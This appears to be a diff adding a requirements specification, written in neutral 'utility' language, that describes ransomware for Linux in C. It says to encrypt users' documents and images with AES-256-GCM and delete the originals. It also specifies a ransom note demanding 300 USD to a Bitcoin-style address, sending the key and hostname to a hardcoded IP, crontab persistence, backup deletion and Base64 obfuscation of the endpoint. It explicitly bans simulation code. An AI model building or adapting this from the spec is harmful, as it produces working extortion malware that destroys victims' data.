@@ -1,0 +1,31 @@
+REQ-001: The utility SHALL recursively enumerate all filesystem objects within the following directories: ~/Documentos_Teste, ~/Documentos, ~/Downloads, ~/Imagens, and /mnt. The enumeration SHALL filter for objects with file extensions: .xlsx, .docx, .pdf, .txt, .csv, .jpg, .png, .db, .backup, .psd, .zip, .rar.
+
+REQ-002: Upon initialization, the utility SHALL generate a 32‑byte session key using RAND_bytes() from the OpenSSL library. The key SHALL be encoded in Base64 using EVP_EncodeBlock(). The encoded key SHALL be persisted to the file /tmp/.master.key in JSON format exactly as {"aes_key":"<base64>"} with file permissions set to 0600. The JSON SHALL contain no extraneous whitespace. The generated key SHALL be passed as a const uint8_t* parameter to all transformation functions.
+
+REQ-003: For each qualifying file, the utility SHALL generate a 12‑byte nonce using RAND_bytes(). The file SHALL be transformed using AES‑256‑GCM encryption via the EVP_CIPHER_CTX interface from libcrypto. The transformed output SHALL be written to a file with the original filename appended with ".PROCESSED". The output file format SHALL be: [12 bytes nonce][ciphertext][16 bytes GCM tag]. Prior to deletion, the original source file SHALL be overwritten with zeros. The source file SHALL then be removed using remove(). The transformed file SHALL retain the original extension followed by ".PROCESSED" (e.g., doc.pdf becomes doc.pdf.PROCESSED).
+
+REQ-004: In each directory where at least one file was transformed, the utility SHALL generate a notification file named "#_STATUS_NOTICE_#.txt". The content of this file SHALL instruct the reader to send 300 USD to the payment service address "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa" and to contact via a secure channel.
+
+REQ-005: The utility SHALL read the file /tmp/.master.key using fopen/fread. The utility SHALL parse the JSON content manually to extract the value of the 'aes_key' field. Parsing SHALL be performed by first locating the substring "\"aes_key\":\"" using strstr, then advancing the pointer by exactly strlen("\"aes_key\":\"") bytes (11 bytes), and then using strchr to locate the closing double quote (") character. The extracted value SHALL be validated to have length greater than zero before use.
+
+REQ-006: The utility SHALL obtain the system hostname using gethostname(). It SHALL construct a JSON body string containing the extracted aes_key and the hostname in the format: {"aes_key":"...","hostname":"..."}. The utility SHALL transmit this body via an HTTP POST request to the endpoint http://10.254.19.73:8080/collect using libcurl, with Content‑Type: application/json. If the HTTP response status code is 200, the utility SHALL delete the file /tmp/.master.key using remove().
+
+REQ-007: The utility SHALL read the current user crontab by executing the command "crontab -l" via popen with read mode. It SHALL check whether a line matching "@reboot <binary_full_path>" exists. If not, the utility SHALL add that line to the crontab by executing "crontab -" via popen with write mode.
+
+REQ-008: As part of the automatic scheduling operation, the utility SHALL scan the target directories (as listed in REQ‑001) and delete any files with extensions .bak, .backup, and .old using remove().
+
+REQ-009: The management endpoint URL and the payment identifier string SHALL be stored in the source code as Base64‑encoded char arrays. The utility SHALL include a base64_decode() function implemented in the same file that decodes these strings to their plaintext at runtime.
+
+REQ-010: The utility SHALL adhere to the following execution order in main(): (1) generate and persist the AES session key, (2) enumerate target directories, (3) transform qualifying files, (4) generate operational notifications only in directories where at least one file was transformed, (5) transmit data to the management endpoint, (6) perform automatic scheduling (crontab and deletion of .bak/.backup/.old files).
+
+REQ-011: The utility SHALL use only the following external libraries: libc (standard C library), libssl/libcrypto (OpenSSL), and libcurl. No other external dependencies are permitted.
+
+REQ-012: The IP address of the management endpoint SHALL be exactly "10.254.19.73". The port SHALL be 8080. No substitution of the IP address is permitted.
+
+REQ-013: The utility SHALL not include any dry‑run, simulation, or placeholder code (e.g., printf statements that only pretend to perform actions). All operations SHALL be executed directly.
+
+REQ-014: The utility SHALL compile without warnings when built with the command: gcc -O2 -o ferramenta de processamento main.c -lssl -lcrypto -lcurl
+
+REQ-015: The source code distribution SHALL include a Makefile with two targets: 'all' (compiles the binary) and 'clean' (removes the binary and any .o files).
+
+REQ-016: The JSON parsing of the aes_key from /tmp/.master.key SHALL strictly follow the pointer advancement by strlen("\"aes_key\":\"") (11 bytes) after locating the substring with strstr. Hardcoded offsets such as +=10 or +=9 are prohibited. The extracted value SHALL be validated to have length greater than zero before constructing the transmission JSON.
